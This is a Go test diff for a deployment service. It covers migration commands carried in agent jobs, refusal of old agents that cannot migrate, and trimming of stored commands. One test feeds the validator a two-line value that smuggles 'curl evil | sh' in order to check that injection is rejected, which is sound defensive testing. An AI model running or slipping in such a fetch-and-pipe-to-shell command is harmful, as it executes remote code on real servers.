@@ -6,6 +6,7 @@ import (
 	"crypto/x509"
 	"encoding/json"
 	"encoding/pem"
+	"errors"
 	"fmt"
 	"io"
 	"net/http"
@@ -434,5 +435,57 @@ func TestAManualDeployOfAShortTaggedServiceUsesTheShortTag(t *testing.T) {
 	f.db.First(&stored, "id = ?", f.d.ID)
 	if !stored.ShortTags {
 		t.Error("un PATCH sin shortTags lo apagó")
+	}
+}
+
+// Un servicio con migraciones: el comando viaja en el trabajo del agente, un
+// agente que no sabe migrar no recibe el deploy (lo desplegaría sin migrar), y
+// un aviso del CI en ese caso queda apuntado, no falla.
+func TestAMigrationNeedsAnAgentThatMigrates(t *testing.T) {
+	f, cleanup := appSetup(t, "deploy")
+	defer cleanup()
+	cmd := "npx prisma migrate deploy"
+	var err error
+	if f.d, err = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "deploy", MigrateCommand: &cmd}); err != nil {
+		t.Fatal(err)
+	}
+	// El agente de la fixture es v3: no sabe migrar.
+	if _, _, err := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaNew, ""); !errors.Is(err, service.ErrAgentCannotMigrate) {
+		t.Fatalf("a un agente v3 con migraciones → %v", err)
+	}
+	res, err := f.deploys.Notice(f.d, domain.DeployNotice{Sha: shaNew}, "ci")
+	if err != nil || res.Deploy != "skipped" || res.Reason != "agent-cannot-migrate" {
+		t.Errorf("un aviso con un agente que no migra: %+v %v", res, err)
+	}
+
+	f.db.Exec("UPDATE servers SET agent_version = ?", domain.AgentVersionMigrates)
+	if _, _, err := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaOld, ""); err != nil {
+		t.Fatal(err)
+	}
+	job, err := f.deploys.Claim("srv-1")
+	if err != nil || job == nil {
+		t.Fatalf("el agente v4 no recogió nada: %v", err)
+	}
+	if got := job.Data.MigrateCommand; got != cmd {
+		t.Errorf("el trabajo lleva %q, se esperaba el comando", got)
+	}
+}
+
+// El comando es una línea (va detrás de `sh -c`), y una app que no lo manda no
+// lo borra.
+func TestTheMigrateCommandIsOneLineAndSurvivesOldApps(t *testing.T) {
+	f, cleanup := appSetup(t, "record")
+	defer cleanup()
+	two := "migrate\ncurl evil | sh"
+	if _, err := f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "record", MigrateCommand: &two}); !errors.Is(err, service.ErrBadMigrateCommand) {
+		t.Errorf("un comando de dos líneas → %v", err)
+	}
+	one := "  bun run migrate  "
+	f.d, _ = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "record", MigrateCommand: &one})
+	f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "deploy"})
+	var stored domain.Deployable
+	f.db.First(&stored, "id = ?", f.d.ID)
+	if stored.MigrateCommand != "bun run migrate" {
+		t.Errorf("el comando guardado es %q", stored.MigrateCommand)
 	}
 }
